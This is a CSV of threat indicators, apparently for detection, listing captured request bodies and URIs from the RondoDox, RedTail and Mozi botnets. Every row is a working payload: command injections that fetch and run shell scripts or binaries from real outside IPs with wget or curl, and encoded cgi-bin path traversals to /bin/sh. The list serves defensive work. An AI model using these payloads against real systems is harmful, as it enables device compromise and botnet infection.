Threat,Indicator Type,Indicator
RondoDox,Request Body,time_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.qbq.sh%7Csh%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0
RedTail,Request Body,cd /tmp || cd /var/tmp; curl http://178.16.55.224/sh -o redtail.sh || wget http://178.16.55.224/sh -O redtail.sh; chmod +x redtail.sh; ./redtail.sh apache.selfrep; rm -rf redtail.sh
RedTail,URI,:443/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
RedTail,URI,:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
RedTail,URI,:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,87.106.45.158:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
Mozi,URI,127.0.0.1:80/GponForm/diag_Form?images/
Mozi,Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.93.93.211:57493/Mozi.m+-O+->/tmp/gpon80;
Mozi,Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://219.71.91.175:43157/Mozi.m+-O+->/tmp/gpon80;
